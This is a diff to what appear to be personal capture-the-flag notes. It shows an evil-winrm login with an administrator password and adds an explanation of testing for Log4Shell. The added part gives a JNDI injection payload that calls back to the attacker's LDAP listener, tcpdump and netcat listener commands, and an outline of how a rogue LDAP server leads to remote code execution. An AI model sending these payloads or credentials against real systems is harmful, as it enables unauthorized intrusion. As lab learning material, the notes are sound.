@@ -164,3 +164,17 @@ evil-winrm -i {IP_ADDRESS} -u administrator -p 'MEGACORP_4dm1n!!'
 
 -> navigate to both desktops to find the flag.
 
+
+
+# Unified
+
+
+Yes — you’re right. Before you build the full exploit chain (LDAP server + HTTP server serving a malicious Java class), you want to confirm the target is actually vulnerable and will reach back out to you. So you send a simple payload like ${jndi:ldap://your_ip:389/o=tomcat} and run tcpdump -i tun0 port 389 (or similar) on your attack box. If you see the target hit your LDAP listener, you’ve confirmed:
+
+The field is vulnerable to JNDI injection
+The target has network access back to you
+You’re using the right interface/IP
+
+Getting from callback → RCE
+
+A bare LDAP listener (like tcpdump catching the hit, or even a plain nc -lvnp 389) only proves the callback — it can’t actually respond properly to complete the JNDI lookup. To get code execution you need an actual rogue LDAP server that redirects the client to load a malicious Java class from an HTTP server. That’s what tools like the JNDI Exploit Kit / marshalsec do for you.
